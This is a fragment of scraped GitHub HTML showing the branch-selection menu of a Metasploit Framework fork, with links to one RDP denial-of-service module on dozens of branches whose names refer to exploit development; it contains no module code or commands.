                 data-name="bcoles-qnx_qconn_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bcoles-qnx_qconn_exec">bcoles-qnx_qconn_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/beehive_upload/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="beehive_upload"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="beehive_upload">beehive_upload</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bigant_server_dupf_upload/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bigant_server_dupf_upload"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bigant_server_dupf_upload">bigant_server_dupf_upload</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bigant_server_sch_dupf_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bigant_server_sch_dupf_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bigant_server_sch_dupf_bof">bigant_server_sch_dupf_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bmerinofe-telnet_ruggedcom/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bmerinofe-telnet_ruggedcom"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bmerinofe-telnet_ruggedcom">bmerinofe-telnet_ruggedcom</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bug/7292-testcase/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bug/7292-testcase"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bug/7292-testcase">bug/7292-testcase</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bug/active_support/dependencies-compatibility/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bug/active_support/dependencies-compatibility"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bug/active_support/dependencies-compatibility">bug/active_support/dependencies-compatibility</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bug/fastlib-nested-pathnames/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bug/fastlib-nested-pathnames"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bug/fastlib-nested-pathnames">bug/fastlib-nested-pathnames</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bug/fix-double-slashes/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bug/fix-double-slashes"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bug/fix-double-slashes">bug/fix-double-slashes</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bug/handle-100-continue/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bug/handle-100-continue"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bug/handle-100-continue">bug/handle-100-continue</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bug/read-module-content-errno-enoent/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bug/read-module-content-errno-enoent"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bug/read-module-content-errno-enoent">bug/read-module-content-errno-enoent</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bug/windows-pro-modules/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bug/windows-pro-modules"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bug/windows-pro-modules">bug/windows-pro-modules</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bug/wrong-file_changed-argument/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bug/wrong-file_changed-argument"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bug/wrong-file_changed-argument">bug/wrong-file_changed-argument</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bulletproof_ftp_creds/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bulletproof_ftp_creds"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bulletproof_ftp_creds">bulletproof_ftp_creds</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bump-rails-gemcache/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bump-rails-gemcache"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bump-rails-gemcache">bump-rails-gemcache</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/chasys_draw_ies_bmp_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="chasys_draw_ies_bmp_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="chasys_draw_ies_bmp_bof">chasys_draw_ies_bmp_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/claudijd-master/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="claudijd-master"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="claudijd-master">claudijd-master</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/cmaruti-Dell_iDrac/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="cmaruti-Dell_iDrac"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="cmaruti-Dell_iDrac">cmaruti-Dell_iDrac</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/cmd_stager_echo/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="cmd_stager_echo"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="cmd_stager_echo">cmd_stager_echo</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/cmd_windows_ruby/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="cmd_windows_ruby"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="cmd_windows_ruby">cmd_windows_ruby</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/cmdstager_echo_linux/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="cmdstager_echo_linux"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="cmdstager_echo_linux">cmdstager_echo_linux</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/cogent_datahub_request_headers_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="cogent_datahub_request_headers_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="cogent_datahub_request_headers_bof">cogent_datahub_request_headers_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/coldfusion9_fingerprint/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="coldfusion9_fingerprint"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="coldfusion9_fingerprint">coldfusion9_fingerprint</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/coldfusion_review/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="coldfusion_review"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="coldfusion_review">coldfusion_review</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/complete_nodejs_exploit/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="complete_nodejs_exploit"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="complete_nodejs_exploit">complete_nodejs_exploit</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/cookie_max_age/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="cookie_max_age"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="cookie_max_age">cookie_max_age</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/coolpdf_image_stream_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="coolpdf_image_stream_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="coolpdf_image_stream_bof">coolpdf_image_stream_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/corelpdf_fusion_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="corelpdf_fusion_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="corelpdf_fusion_bof">corelpdf_fusion_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/crashbrz-patch-1/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="crashbrz-patch-1"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="crashbrz-patch-1">crashbrz-patch-1</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/crystal_reports_printcontrol/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="crystal_reports_printcontrol"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="crystal_reports_printcontrol">crystal_reports_printcontrol</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/cve-2013-2641/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="cve-2013-2641"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="cve-2013-2641">cve-2013-2641</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/cwe_support/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="cwe_support"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="cwe_support">cwe_support</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/darkoperator-pingsweep_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="darkoperator-pingsweep_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="darkoperator-pingsweep_fix">darkoperator-pingsweep_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/darkoperator-skype_enum/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="darkoperator-skype_enum"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="darkoperator-skype_enum">darkoperator-skype_enum</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/datalife_preview_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="datalife_preview_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="datalife_preview_exec">datalife_preview_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/datalife_template/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="datalife_template"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="datalife_template">datalife_template</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/dcbz-master/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="dcbz-master"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="dcbz-master">dcbz-master</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/dcbz-osxpayloads/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="dcbz-osxpayloads"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="dcbz-osxpayloads">dcbz-osxpayloads</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/delete_mutiny_debug/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="delete_mutiny_debug"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="delete_mutiny_debug">delete_mutiny_debug</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/devise_clean/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="devise_clean"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="devise_clean">devise_clean</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/dlink_dir_300_615_http_login_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="dlink_dir_300_615_http_login_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="dlink_dir_300_615_http_login_work">dlink_dir_300_615_http_login_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/dlink_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="dlink_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="dlink_fix">dlink_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/dlink_review/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="dlink_review"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="dlink_review">dlink_review</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/dlink_upnp_cleanup/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="dlink_upnp_cleanup"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="dlink_upnp_cleanup">dlink_upnp_cleanup</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/dmaloney-r7-WinRM_piecemeal/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="dmaloney-r7-WinRM_piecemeal"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="dmaloney-r7-WinRM_piecemeal">dmaloney-r7-WinRM_piecemeal</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/dns_info_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="dns_info_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="dns_info_fix">dns_info_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/download_exec_mod/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="download_exec_mod"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="download_exec_mod">download_exec_mod</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/download_exec_shell/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="download_exec_shell"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="download_exec_shell">download_exec_shell</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/dvr_config/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="dvr_config"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="dvr_config">dvr_config</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/eap_md5/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="eap_md5"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="eap_md5">eap_md5</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/eddiezab-master/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="eddiezab-master"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="eddiezab-master">eddiezab-master</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ektron_xslt_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ektron_xslt_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ektron_xslt_exec">ektron_xslt_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ektron_xslt_exec_nicob/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ektron_xslt_exec_nicob"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ektron_xslt_exec_nicob">ektron_xslt_exec_nicob</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/enterasys_netsight_syslog_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="enterasys_netsight_syslog_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="enterasys_netsight_syslog_bof">enterasys_netsight_syslog_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/erdas_er_viewer_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="erdas_er_viewer_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="erdas_er_viewer_bof">erdas_er_viewer_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/erdas_er_viewer_rf_report_error/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="erdas_er_viewer_rf_report_error"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="erdas_er_viewer_rf_report_error">erdas_er_viewer_rf_report_error</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/esmnemon-modbus-aux/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="esmnemon-modbus-aux"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="esmnemon-modbus-aux">esmnemon-modbus-aux</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ethicalhack3r-php_include/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ethicalhack3r-php_include"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ethicalhack3r-php_include">ethicalhack3r-php_include</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/exim4_dovecot_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="exim4_dovecot_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="exim4_dovecot_exec">exim4_dovecot_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/f5_big_ip_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="f5_big_ip_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="f5_big_ip_work">f5_big_ip_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fail_with_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
